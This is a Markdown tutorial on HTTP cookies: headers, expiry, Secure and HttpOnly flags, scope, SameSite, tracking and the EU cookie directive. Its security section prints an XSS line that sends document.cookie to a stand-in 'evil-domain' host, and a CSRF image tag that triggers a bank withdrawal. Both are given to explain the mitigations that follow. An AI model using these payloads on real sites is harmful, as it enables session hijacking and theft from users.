#Cookies
##What is a cookie?
>**An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to the user's web browser, that may store it and send it back together with the next request to the same server. Typically, it's used to know if two requests came from the same browser allowing to keep a user logged-in, for example. It remembers stateful information for the stateless HTTP protocol.**

Cookies are mainly used for these three purposes:

- Session management 
- - Personalization
- Tracking 

Cookies have also been used for general client-side storage. While this use could have been considered legitimate at a time when there was no other way to store data on the client side, it is no longer the case nowadays where web browsers are capable of using various storage APIs. Since cookies are sent along with every request, it can be an additional performance burden.

##Creating Cookies
When receiving an HTTP request, a server can send a **Set-Cookie** header with the response. The cookie is usually stored by the browser and, afterwards, the cookie value is sent along with every request made to the same server as the content of a Cookie HTTP header. Additionally, an expiration delay can be specified as well as restrictions to a specific domain and path, limiting how long and to which site the cookie is sent to.

##The Set-Cookie and Cookie headers
The Set-Cookie HTTP response header is used to send cookies from the server to the user agent. A simple cookie can be set like this:
>Set-Cookie: < cookie-name>=< cookie-value>

The server tells the client to store a cookie. The response sent to the browser will contain the Set-Cookie header and the browser will store the cookie.
>HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry
[page content]

Now, with every new request to the server, the browser will send back all previously stored cookies to the server using the Cookie header.
>GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry

###Session cookies
The simple cookie created above is a *session cookie*: It will get removed when the client is shut down, they last only for the duration of the session. They don't specify any Expires or Max-Age directives. 
###Permanent cookies
Instead of expiring when the client is closed, *permanent cookies* expire at a specific date (Expires) or after a specific length of time (Max-Age).
>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

###Secure and HttpOnly cookies
A secure cookie will only be sent to the server when a request is made using SSL and the HTTPS protocol. However, note that confidential or sensitive information should never be stored or transmitted in HTTP Cookies as the entire mechanism is inherently insecure and this flag won't offer you any additional encryption or security. 

To prevent cross-site scripting (XSS) attacks, HTTP-only cookies aren't accessible via JavaScript through the Document.cookie property, the XMLHttpRequest and Request APIs. Set this flag when you don't need your cookies available in JavaScript. 
>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly

###Scope of cookies
The Domain and Path directives define the scope of the cookie, that is the set of URLs the cookies should be sent back to.

Domain specifies those hosts to which the cookie will be sent. If not specified, defaults to the host portion of the current document location (but not including subdomains). If a domain is specified, subdomains are always included.

If Domain=mozilla.org is set, cookies are included on subdomains like developer.mozilla.org.

Path indicates a URL path that must exist in the requested resource before sending the Cookie header.

If Path=/docs is set, these paths will all be matched:

- "/docs",
- "/docs/Web/",
- "/docs/Web/HTTP"
###SameSite cookies  
SameSite cookies allow servers to assert that a cookie ought not to be sent along with cross-site requests, which provides some protection against cross-site request forgery attacks (CSRF). 

###JavaScript access using Document.cookies
New cookies can also be created using the **Document.cookie** property, and if the HttpOnly flag is not set, existing cookies can be accessed from JavaScript as well.
```javascript
document.cookie = "yummy_cookie=choco"; 
document.cookie = "tasty_cookie=strawberry"; 
console.log(document.cookie); 
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
```

##Security
###Session hijacking and XSS
Cookies are often used in web application to identify a user and their authenticated session. So stealing a cookie from a web application can lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an *XSS* vulnerability in the application.
```javascript
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

The HttpOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript.

###Cross-site request forgery (CSRF)
[Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) mentions a good example for *CSRF*. In this situation, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money:
```javascript
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```
Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image. There are a few techniques that are used to prevent this from happening:

- As with XSS, input filtering is important.
- There should always be a confirmation required for any sensitive action.
- Cookies that are used for sensitive actions should have a short lifetime only.
- For more prevention tips, see the OWASP CSRF prevention cheat sheet.

##Tracking and privacy
###Third-party cookies
Cookies have a domain associated to them. If this domain is the same as the domain of the page you are on, the cookies is said to be a first-party cookie. If the domain is different, it is said to be a third-party cookie. While first-party cookies are sent only to the server setting them, a web page may contain images or other components stored on servers in other domains (like ad banners). Cookies that are sent through these third-party components are called third-party cookies and are mainly used for advertising and tracking across the web. 

###Do-Not-Track
There are no legal or technological requirements for its use, but the DNT header can be used to signal that a web application should disable either its tracking or cross-site user tracking of an individual user. 

###EU cookie directive
Requirements for cookies across the EU are defined in [Directive 2009/136/EC](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136) of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.
In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners since then to inform the user about the use of cookies.

###Zombie cookies and Evercookies
A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the *Web storage API*, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.